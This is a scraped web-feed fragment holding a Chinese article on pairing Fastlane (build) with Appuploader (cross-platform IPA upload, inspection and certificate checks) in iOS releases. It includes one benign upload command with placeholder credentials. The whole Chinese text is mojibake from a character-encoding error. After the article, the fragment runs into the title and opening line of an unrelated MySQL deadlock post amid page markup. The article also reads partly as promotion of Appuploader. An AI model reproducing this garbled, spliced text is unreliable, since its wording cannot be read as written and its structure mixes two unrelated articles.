            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3850962908492660/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¼€å¿ƒå°±å¥½2025
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:47:13.000Z" title="Mon Dec 15 2025 09:47:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ iOS è‡ªåŠ¨åŒ–å‘å¸ƒä½“ç³»ä¸­ï¼ŒFastlane å‡ ä¹æ˜¯ç»•ä¸å¼€çš„å·¥å…·ã€‚å®ƒè¦†ç›–äº†ä»è¯ä¹¦ç®¡ç†ã€æ„å»ºã€ç‰ˆæœ¬å·å¤„ç†åˆ° TestFlight ä¸Šä¼ çš„å¤šä¸ªç¯èŠ‚ï¼Œæ˜¯è®¸å¤šå›¢é˜Ÿ CI/CD çš„æ ¸å¿ƒç»„ä»¶ã€‚ä½†åœ¨çœŸå®å·¥ç¨‹ä¸­ï¼ŒFastlane å¹¶ä¸èƒ½è¦†ç›–æ‰€æœ‰åœºæ™¯ï¼Œå°¤å…¶æ˜¯åœ¨ <strong>è·¨å¹³å°å›¢é˜Ÿã€é macOS ç¯å¢ƒã€ä¸Šä¼ é“¾è·¯è§£è€¦</strong> è¿™äº›éœ€æ±‚å‡ºç°ä¹‹åï¼Œå…¶å±€é™ä¹Ÿé€æ¸æ˜¾ç°ã€‚</p>
<p>æœ¬æ–‡ä»å·¥ç¨‹è§’åº¦è®¨è®ºä¸€ä¸ªå®è·µæ€§è¾ƒå¼ºçš„è¯é¢˜ï¼šFastlane ä¸ Appuploader å¦‚ä½•åœ¨åŒä¸€æ¡å‘å¸ƒæµç¨‹ä¸­ååŒå·¥ä½œã€‚</p>
<hr/>
<h2 data-id="heading-0"><strong>ä¸€ã€Fastlane åœ¨ iOS å‘å¸ƒæµç¨‹ä¸­çš„æ ¸å¿ƒå®šä½</strong></h2>
<p>ä»åŠŸèƒ½ä¸Šçœ‹ï¼ŒFastlane çš„èƒ½åŠ›ä¸»è¦é›†ä¸­åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p>
<ul>
<li>ä½¿ç”¨ <code>match</code> / <code>cert</code> / <code>sigh</code> ç®¡ç†è¯ä¹¦ä¸æè¿°æ–‡ä»¶</li>
<li>ä½¿ç”¨ <code>gym</code> æ„å»º IPA</li>
<li>ä½¿ç”¨ <code>deliver</code> / <code>pilot</code> ä¸Šä¼ è‡³ App Store Connect</li>
<li>è‡ªåŠ¨å¤„ç†ç‰ˆæœ¬å·ã€Build å·ã€å…ƒæ•°æ®</li>
</ul>
<p>åœ¨ <strong>çº¯ macOSã€çº¯ iOS å›¢é˜Ÿ</strong> ä¸­ï¼Œè¿™å¥—ä½“ç³»è¿è½¬è‰¯å¥½ã€‚ä½†åœ¨å·¥ç¨‹è§„æ¨¡æ‰©å¤§åï¼Œä»¥ä¸‹é—®é¢˜å¼€å§‹å‡ºç°ï¼š</p>
<ul>
<li>CI èŠ‚ç‚¹å¹¶éå…¨éƒ¨æ˜¯ macOS</li>
<li>Windows / Linux æˆå‘˜éœ€è¦å‚ä¸å‘å¸ƒæµç¨‹</li>
<li>ä¸Šä¼ æ­¥éª¤éœ€è¦ä¸æ„å»ºæ­¥éª¤è§£è€¦</li>
<li>Fastlane å¯¹ Transporter / altool ä¾èµ–è¾ƒæ·±</li>
<li>ä¸Šä¼ å¤±è´¥æ—¶è°ƒè¯•æˆæœ¬é«˜</li>
</ul>
<p>è¿™äº›é—®é¢˜å¹¶ä¸æ˜¯ Fastlane çš„ç¼ºé™·ï¼Œè€Œæ˜¯å®ƒçš„è®¾è®¡å‰æå†³å®šçš„ã€‚</p>
<hr/>
<h2 data-id="heading-1"><strong>äºŒã€Fastlane çš„å¤©ç„¶å‰æï¼šmacOS æ˜¯ä¸­å¿ƒèŠ‚ç‚¹</strong></h2>
<p>éœ€è¦æ˜ç¡®ä¸€ç‚¹ï¼š</p>
<blockquote>
<p><strong>Fastlane æ˜¯ä»¥ macOS ä¸ºä¸­å¿ƒè®¾è®¡çš„è‡ªåŠ¨åŒ–å·¥å…·ã€‚</strong></p>
</blockquote>
<p>å…¶æ ¸å¿ƒä¾èµ–åŒ…æ‹¬ï¼š</p>
<ul>
<li>Xcode</li>
<li>Xcode Command Line Tools</li>
<li>Transporter / altool</li>
<li>macOS Keychain</li>
</ul>
<p>å› æ­¤ï¼Œå½“ä½ çš„æµç¨‹å‡ºç°ä»¥ä¸‹æƒ…å†µæ—¶ï¼ŒFastlane å°±ä¼šå¼€å§‹æ˜¾å¾—â€œç¬¨é‡â€ï¼š</p>
<ul>
<li>æ„å»ºåœ¨ macOSï¼Œä½†ä¸Šä¼ å¸Œæœ›åœ¨ Linux/Windows æ‰§è¡Œ</li>
<li>ä¸Šä¼ éœ€è¦è„šæœ¬åŒ–é‡è¯•ï¼Œä½†ä¸æƒ³å†æ‹‰èµ· Fastlane ç¯å¢ƒ</li>
<li>å¸Œæœ›æŠŠ IPA å½“ä½œåˆ¶å“ï¼Œåœ¨ä¸åŒç³»ç»Ÿé—´æµè½¬</li>
</ul>
<p>è¿™æ—¶ï¼Œå¾ˆå¤šå›¢é˜Ÿä¼šå¼€å§‹è€ƒè™‘ <strong>æ‹†åˆ† Fastlane çš„èŒè´£</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-2"><strong>ä¸‰ã€å°† Fastlane çš„èŒè´£é™å®šåœ¨â€œæ„å»ºé˜¶æ®µâ€</strong></h2>
<p>åœ¨å®é™…å·¥ç¨‹ä¸­ï¼Œä¸€ä¸ªæ›´ç¨³å®šçš„åšæ³•æ˜¯ï¼š</p>
<ul>
<li><strong>Fastlane åªè´Ÿè´£æ„å»ºä¸æ‰“åŒ…</strong></li>
<li><strong>ä¸Šä¼ ä¸æ ¡éªŒäº¤ç”±æ›´è½»é‡ã€è·¨å¹³å°çš„å·¥å…·å®Œæˆ</strong></li>
</ul>
<p>ä¾‹å¦‚ï¼Œä¸€ä¸ªå…¸å‹çš„æ‹†åˆ†æ–¹å¼æ˜¯ï¼š</p>
<ol>
<li>Fastlane ä½¿ç”¨ <code>gym</code> æ„å»º IPA</li>
<li>IPA ä½œä¸ºæ„å»ºäº§ç‰©å­˜å‚¨</li>
<li>åç»­æ­¥éª¤ä¸å†ä¾èµ– Fastlane ç¯å¢ƒ</li>
</ol>
<p>åœ¨è¿™ä¸ªé˜¶æ®µï¼Œå¼•å…¥ <strong>Appuploader</strong> ä½œä¸ºè¡¥å……å·¥å…·å°±å…·å¤‡ç°å®æ„ä¹‰ã€‚</p>
<hr/>
<h2 data-id="heading-3"><strong>å››ã€Appuploader åœ¨ Fastlane ä½“ç³»ä¸­çš„è¡¥å……è§’è‰²</strong></h2>
<p>åœ¨ä¸ Fastlane æ­é…ä½¿ç”¨æ—¶ï¼Œ<strong>å¼€å¿ƒä¸Šæ¶ï¼ˆAppuploaderï¼‰</strong> é€šå¸¸ä¸æ›¿ä»£ Fastlaneï¼Œè€Œæ˜¯æ‰¿æ‹…ä»¥ä¸‹å‡ ç±»å·¥ä½œï¼š</p>
<hr/>
<h3 data-id="heading-4"><strong>1. è·¨å¹³å°ä¸Šä¼  IPAï¼Œæ›¿ä»£ deliver / pilot çš„æ‰§è¡Œç¯å¢ƒ</strong></h3>
<p>Fastlane çš„ä¸Šä¼ åŠ¨ä½œï¼š</p>
<ul>
<li>ä¾èµ– macOS</li>
<li>ä¾èµ– Transporter</li>
<li>å¤±è´¥æ—¶é‡è·‘æˆæœ¬è¾ƒé«˜</li>
</ul>
<p>è€Œ Appuploader æä¾›çš„ä¸Šä¼ æ–¹å¼å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<ul>
<li>æ”¯æŒ <strong>Windows / Linux / macOS</strong></li>
<li>ä¸ä¾èµ– Xcode</li>
<li>å¯é€šè¿‡å‘½ä»¤è¡Œæ‰§è¡Œ</li>
<li>æ˜“äºè„šæœ¬åŒ–å’Œé‡è¯•</li>
</ul>
<p>ç¤ºä¾‹ï¼ˆä½œä¸º Fastlane æ„å»ºåçš„ç‹¬ç«‹æ­¥éª¤ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">appuploader_cli -u appleid@example.com -p xxxx-xxxx -c 1 -f build.ipa
</code></pre>
<p>è¿™æ„å‘³ç€ï¼š</p>
<ul>
<li>Fastlane ä¸å†æ˜¯â€œå”¯ä¸€ä¸Šä¼ å…¥å£â€</li>
<li>ä¸Šä¼ æ­¥éª¤å¯ä»¥æ”¾åˆ°ä»»æ„ç³»ç»Ÿæ‰§è¡Œ</li>
<li>CI ä¸­å¯ä»¥æ›´çµæ´»åœ°æ‹†åˆ†é˜¶æ®µ</li>
</ul>
<p>GUIç•Œé¢ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d6a24042671440a91e8e03bf72e67ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5b-D5bCx5aW9MjAyNQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766396832&amp;x-signature=IlxQyJS1QLmqd8gnhg%2BSwVj1eJU%3D" alt="ipaä¸Šä¼ " loading="lazy"/></p>
<hr/>
<h3 data-id="heading-5"><strong>2. æ„å»ºå IPA çš„å·¥ç¨‹çº§æ£€æŸ¥</strong></h3>
<p>Fastlane å¹¶ä¸ä¼šéªŒè¯ IPA æ˜¯å¦â€œé€‚åˆä¸Šæ¶â€ï¼Œå®ƒåªä¿è¯æ„å»ºæˆåŠŸã€‚</p>
<p>åœ¨å®é™…æµç¨‹ä¸­ï¼ŒAppuploader å¸¸è¢«ç”¨äºï¼š</p>
<ul>
<li>æŸ¥çœ‹ IPA å†…çš„ Info.plist</li>
<li>ç¡®è®¤ Bundle ID</li>
<li>æ ¡éªŒæè¿°æ–‡ä»¶ç±»å‹</li>
<li>æ£€æŸ¥æ˜¯å¦åŒ…å« Assets.car</li>
</ul>
<p>è¿™äº›æ£€æŸ¥å¯ä»¥åœ¨ <strong>é macOS</strong> ç¯å¢ƒæ‰§è¡Œï¼Œé€‚åˆæ„å»ºå®Œæˆåçš„è´¨é‡å…³å¡ã€‚</p>
<hr/>
<h3 data-id="heading-6"><strong>3. è¯ä¹¦ä¸æè¿°æ–‡ä»¶çš„å¯è§†åŒ–è¡¥å……</strong></h3>
<p>Fastlane çš„è¯ä¹¦ç®¡ç†æ˜¯â€œè‡ªåŠ¨åŒ–ä¼˜å…ˆâ€çš„ï¼Œä½†ä¿¡æ¯å¹¶ä¸ç›´è§‚ã€‚</p>
<p>åœ¨æ’æŸ¥é—®é¢˜æ—¶ï¼Œæˆ‘é€šå¸¸ä¼šï¼š</p>
<ul>
<li>ä½¿ç”¨ Appuploader æŸ¥çœ‹ mobileprovision å†…å®¹</li>
<li>æ ¡éªŒè¯ä¹¦æŒ‡çº¹æ˜¯å¦ä¸€è‡´</li>
<li>ç¡®è®¤æè¿°æ–‡ä»¶æ˜¯å¦ä¸ºå‘å¸ƒç±»å‹</li>
</ul>
<p>è¿™åœ¨ä»¥ä¸‹åœºæ™¯å°¤å…¶é‡è¦ï¼š</p>
<ul>
<li>Fastlane æ„å»ºæˆåŠŸï¼Œä½†ä¸Šä¼ å¤±è´¥</li>
<li>CI æ›´æ¢èŠ‚ç‚¹åç­¾åå¼‚å¸¸</li>
<li>å¤šè¯ä¹¦å¹¶å­˜ï¼Œéš¾ä»¥ç¡®è®¤å½“å‰ä½¿ç”¨çš„æ˜¯å“ªä¸€ä»½
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b74e68acef84103bda6b72a1d96e892~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5b-D5bCx5aW9MjAyNQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766396832&amp;x-signature=d24PuFWZf8GwUD0HscJHFjcdCog%3D" alt="æŸ¥çœ‹æ–‡ä»¶" loading="lazy"/></li>
</ul>
<hr/>
<h2 data-id="heading-7"><strong>äº”ã€Fastlane + Appuploader çš„ä¸€ä¸ªå®é™…æµç¨‹ç¤ºä¾‹</strong></h2>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªåœ¨çœŸå®é¡¹ç›®ä¸­å¯è¡Œçš„ç»„åˆæµç¨‹ï¼š</p>
<h3 data-id="heading-8"><strong>é˜¶æ®µä¸€ï¼šæ„å»ºï¼ˆmacOSï¼‰</strong></h3>
<ul>
<li>Fastlane <code>gym</code> æ„å»º IPA</li>
<li>ç”Ÿæˆæ„å»ºæ—¥å¿—ä¸äº§ç‰©</li>
</ul>
<h3 data-id="heading-9"><strong>é˜¶æ®µäºŒï¼šåˆ¶å“å­˜å‚¨</strong></h3>
<ul>
<li>IPA ä¸Šä¼ è‡³åˆ¶å“åº“æˆ–å…±äº«å­˜å‚¨</li>
</ul>
<h3 data-id="heading-10"><strong>é˜¶æ®µä¸‰ï¼šæ ¡éªŒï¼ˆä»»æ„ç³»ç»Ÿï¼‰</strong></h3>
<ul>
<li>ä½¿ç”¨ Appuploader æŸ¥çœ‹ IPA å†…å®¹</li>
<li>æ ¡éªŒ Bundle ID / profile / èµ„æºç»“æ„</li>
</ul>
<h3 data-id="heading-11"><strong>é˜¶æ®µå››ï¼šä¸Šä¼ ï¼ˆWindows / Linux / macOSï¼‰</strong></h3>
<ul>
<li>ä½¿ç”¨ Appuploader CLI ä¸Šä¼  IPA</li>
</ul>
<h3 data-id="heading-12"><strong>é˜¶æ®µäº”ï¼šå®¡æ ¸ä¸å‘å¸ƒ</strong></h3>
<ul>
<li>App Store Connect Web æ“ä½œ</li>
</ul>
<p>è¿™ç§æµç¨‹çš„ä¼˜åŠ¿åœ¨äºï¼š</p>
<ul>
<li>Fastlane ä¸å†æ˜¯å•ç‚¹ä¾èµ–</li>
<li>ä¸Šä¼ æ­¥éª¤æ›´å®¹æ˜“å¤±è´¥é‡è¯•</li>
<li>Windows / Linux æˆå‘˜å¯å‚ä¸å‘å¸ƒ</li>
<li>CI æµç¨‹æ›´æ˜“ç»´æŠ¤</li>
</ul>
<hr/>
<h2 data-id="heading-13"><strong>å…­ã€ä»€ä¹ˆæ—¶å€™ä¸éœ€è¦ Fastlane + Appuploader ç»„åˆï¼Ÿ</strong></h2>
<p>éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œè¿™ç§ç»„åˆå¹¶éâ€œå¿…é€‰æ–¹æ¡ˆâ€ã€‚</p>
<p>ä»¥ä¸‹åœºæ™¯ä¸­ï¼Œ<strong>å•ç‹¬ä½¿ç”¨ Fastlane å·²è¶³å¤Ÿ</strong>ï¼š</p>
<ul>
<li>å°å‹å›¢é˜Ÿ</li>
<li>å…¨å‘˜ macOS</li>
<li>æ—  CI æˆ– CI ç®€å•</li>
<li>ä¸éœ€è¦æ‹†åˆ†æ„å»ºä¸ä¸Šä¼ </li>
</ul>
<p>è€Œå½“ä½ é‡åˆ°ä»¥ä¸‹æƒ…å†µæ—¶ï¼Œç»„åˆæ–¹æ¡ˆçš„ä»·å€¼æ‰ä¼šä½“ç°ï¼š</p>
<ul>
<li>CI æ¶æ„å¤æ‚</li>
<li>æ„å»ºä¸ä¸Šä¼ éœ€è¦è§£è€¦</li>
<li>å‘å¸ƒèŠ‚ç‚¹ä¸å›ºå®š</li>
<li>å¤šç³»ç»Ÿåä½œ</li>
<li>å¯¹ä¸Šä¼ ç¨³å®šæ€§è¦æ±‚è¾ƒé«˜</li>
</ul>
<hr/>
<p>Fastlane æ˜¯ä¸€å¥—å¼ºå¤§çš„ iOS è‡ªåŠ¨åŒ–å·¥å…·ï¼Œä½†å®ƒå¹¶ä¸æ˜¯å‘å¸ƒé“¾è·¯ä¸­å”¯ä¸€éœ€è¦å­˜åœ¨çš„è§’è‰²ã€‚
åœ¨ç°ä»£å·¥ç¨‹ä½“ç³»ä¸­ï¼ŒæŠŠ Fastlane ä¸“æ³¨åœ¨å®ƒæœ€æ“…é•¿çš„éƒ¨åˆ†â€”â€”<strong>æ„å»ºä¸é…ç½®è‡ªåŠ¨åŒ–</strong>ï¼Œå†ç”¨ Appuploader è·¨å¹³å°ä¸Šä¼ ã€IPA æ ¡éªŒä¸è¯ä¹¦å¯è§†åŒ–è¿™äº›èƒ½åŠ›ï¼Œå¾€å¾€èƒ½è®©æ•´ä¸ªå‘å¸ƒæµç¨‹æ›´æ¸…æ™°ã€æ›´ç¨³å®šã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•é¿å…MySQLæ­»é”ï¼Ÿèµ„æ·±DBAçš„9æ¡é»„é‡‘æ³•åˆ™]]></title>    <link>https://juejin.cn/post/7583799807593840674</link>    <guid>https://juejin.cn/post/7583799807593840674</guid>    <pubDate>2025-12-15T09:47:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583799807593840674" data-draft-id="7576487832089722895" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•é¿å…MySQLæ­»é”ï¼Ÿèµ„æ·±DBAçš„9æ¡é»„é‡‘æ³•åˆ™"/> <meta itemprop="keywords" content="åç«¯,MySQL"/> <meta itemprop="datePublished" content="2025-12-15T09:47:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åˆ˜å¤§å"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•é¿å…MySQLæ­»é”ï¼Ÿèµ„æ·±DBAçš„9æ¡é»„é‡‘æ³•åˆ™
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åˆ˜å¤§å
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:47:30.000Z" title="Mon Dec 15 2025 09:47:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å¤§åï¼</p>
